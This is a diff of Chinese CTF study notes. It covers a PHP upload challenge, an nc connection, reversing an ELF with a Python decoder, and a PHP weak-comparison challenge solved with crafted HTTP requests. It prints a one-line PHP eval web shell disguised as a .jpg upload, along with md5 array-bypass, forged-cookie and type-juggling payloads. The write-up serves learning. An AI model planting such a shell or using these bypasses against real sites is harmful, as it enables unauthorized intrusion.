@@ -345,6 +345,7 @@ python vol.py -f ..\..\OtterCTF.vmem windows.registry.printkey --key "ControlSet
 ```php
 <?php @eval($_POST['r00ts']);?> 
 ```
+
 保存为test.php，随后重命名为test.jpg，上传
 ***
 \<?php ... ?\>：PHP 的标准脚本标记，表示这是 PHP 代码块。
@@ -377,3 +378,160 @@ r00ts=phpinfo();
 ```
 发出之后即可查看phpinfo，在Environment中找到了flag
 ![alt text](image-57.png)
+## 2.10 新手，reverse，语言逆向，pwn，栈溢出
+### 一.test_nc
+***
+注：网络工具nc（Netcat）常用于网络调试、测试以及数据传输。
+***
+使用nc连接题目给出的网站
+```bash
+nc node5.anna.nssctf.cn 20698
+```
+(注意语法，此处端口前无“:”)<br>
+ls一下看看有哪些文件<br>
+![alt text](image-63.png)<br>
+发现有一个flag文件，cat一下看看内容，得到答案<br>
+![alt text](image-64.png)<br>
+### 二.又是签到！？
+***
+注：jadx 是 Android 反编译工具，主要用于将 APK、DEX、JAR 等文件反编译为接近原始 Java 代码的可读形式
+***
+用jadx打开下载的.apk文件后搜索NSSCTF即可找到flag
+![alt text](image-65.png)
+###三.level1
+下载下来的level1文件夹里包含了一个无后缀文件和一个txt的output文件
+![alt text](image-68.png)
+用010editor打开无后缀文件
+![alt text](image-66.png)
+可知该文件为elf文件，因此可以通过反编译查看其内容，用IDA打开得到汇编代码，按F5得到C代码
+![alt text](image-67.png)
+分析代码：
+```C
+int main()
+{
+  int i;
+  char ptr[24]; //原文
+  for ( i = 1; i <= 19; ++i )//加密
+  {
+    if ( (i & 1) != 0 )//奇数位
+      printf("%ld\n", (unsigned int)(ptr[i] << i));
+    else //偶数位
+      printf("%ld\n", (unsigned int)(i * ptr[i]));
+  }
+  return 0;
+}
+```
+编写解密代码
+```python
+output = [0,198,232,816,200,1536,300,6144,984,51200,570,92160,1200,565248,756,1474560,800,6291456,1782,65536000]
+flag_chars = []
+for i in range(1, len(output)):
+    if i % 2 != 0:
+        char_us = output[i] >> i
+        flag_chars.append(chr(char_us))
+    else:
+        char_us = output[i] // i
+        flag_chars.append(chr(char_us))
+flag = "".join(flag_chars)
+print(flag)
+```
+得到ctf2020{d9-dE6-20c}
+
+## 2.12 进阶，弱比较，数组绕过，反序列化
+### 一.受不了一点
+打开网站后发现php源代码
+![alt text](image-70.png)
+这段php包含以下几层验证，我们逐层分析：<br>
+1.POST请求中是否包含gdou和ctf这两个参数
+```php
+if(isset($_POST['gdou'])&&isset($_POST['ctf'])){
+    $b=$_POST['ctf'];
+    $a=$_POST['gdou'];
+    #下一层验证
+}else{
+  echo "别来沾边";
+}
+```
+现在直接访问，POST请求中不包括变量，所以此时返回的文字为“别来沾边”<br>
+因此用如下请求可以满足当前要求
+```http
+POST / HTTP/1.1
+Host: node4.anna.nssctf.cn:28923
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+
+ctf=1&gdou=2
+```
+2.判断两个变量的值是否不相等但md5值相等
+```php
+if($_POST['gdou']!=$_POST['ctf'] && md5($a)===md5($b)){
+    #下一层验证
+}else{
+    echo "就这?";
+}
+```
+此时1和2的md5值并不相等，所以返回的文字为"就这"<br>
+这里需要用到数组绕过
+***
+注：md5() 不支持数组，但 PHP 可能会 隐式转换数组为字符串，因此将两个变量设置为不同的数组，
+可能会导致他们被序列化或其他的方式转换后相同，进而得到相同的md5值以绕过检验
+***
+发送如下请求可以满足这一层验证
+```http
+POST / HTTP/1.1
+Host: node4.anna.nssctf.cn:28923
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+
+ctf[]=1&gdou[]=2
+```
+3.检查是否为特定cookie
+```php
+if(isset($_COOKIE['cookie'])){
+    if ($_COOKIE['cookie']=='j0k3r'){
+        #下一层验证
+  }
+}
+else {
+  echo '菜菜';
+}
+```
+此时cookie为默认值，因此返回文字为“菜菜”，发送如下修改过cookie的POST请求即可满足验证
+```http
+POST / HTTP/1.1
+Host: node4.anna.nssctf.cn:28923
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Cookie: cookie=j0k3r
+
+ctf[]=1&gdou[]=2
+```
+4.GET参数验证，对于aaa和bbb这两个参数都需要为114514但又不能相等
+```php
+if(isset($_GET['aaa']) && isset($_GET['bbb'])){
+    $aaa=$_GET['aaa'];
+    $bbb=$_GET['bbb'];
+    if($aaa==114514 && $bbb==114514 && $aaa!=$bbb){
+       #下一层验证（但其实此时已经可以得到正确的flag）
+    }else{
+        echo "洗洗睡吧";
+    }
+}else{
+    echo "行不行啊细狗";
+}
+```
+刚刚没有这两个get参数，所以返回的文字为“行不行啊细狗”，如果有参数但不满足条件则返回“洗洗睡吧”<br>
+在字符串和整数的比较中，字符串会被转化为整数，所以两个参数可以一个为114514a，一个为114514，这样在比较的时候114514a会被自动转化为114514
+所以发送如下请求即可获得flag
+```http
+POST /?aaa=114514&bbb=114514a HTTP/1.1
+Host: node4.anna.nssctf.cn:28923
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Cookie: cookie=j0k3r
+Content-Length: 18
+
+ctf[]=1&gdou[]=2
+```
+![alt text](image-69.png)
+### 二.ez_ez_unserialize
